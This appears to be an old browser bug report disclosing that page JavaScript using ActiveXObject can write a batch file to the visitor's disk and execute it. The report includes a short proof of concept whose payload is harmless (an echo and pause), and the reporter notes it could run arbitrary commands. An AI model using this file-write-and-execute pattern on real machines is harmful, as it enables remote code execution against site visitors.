I was goofing off at work and came up with something pretty scary.  I know this should known because it is sooo simple.  It works on internal networks with IE & firefox.  With a little tweaking it could work across the boards internally & externally.  Below is a sample code that should throw some light on how bad this could be.  

<script language="javascript">
       
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var xfile = fso.CreateTextFile("C:\\Program Files\\test2.bat", true);
        xfile.WriteLine("@ECHO Could have got ya!");
        xfile.WriteLine("@PAUSE");
        xfile.close();

        var oShell = new ActiveXObject("Shell.Application");
        var commandtoRun = "C:\\Program Files\\test2.bat";
        oShell.ShellExecute(commandtoRun,"","","open","1");
</script> 

Reproducible: Always

Steps to Reproduce:
1.Drop the code in an page and execute the page.
2.
3.

Actual Results:  
Whatever I want to be executed inside the batch file.

Expected Results:  
Somebody with social issues taking down internal networks?  Like a person with administrator access going to the wrong page.

The ActiveXObject option of JS is a 2 edged sword.  With the XML object I can change any XML File on the client machine I want.  The Good:  Ability to append data to the codehints.xml file for dreamweaver.  Which is great when you create new Objects and want to expose the methods of it.  The Bad... windows Vista is going to be XML driven in alot of ways.  I can 100% garantee someone will get nutts with this.
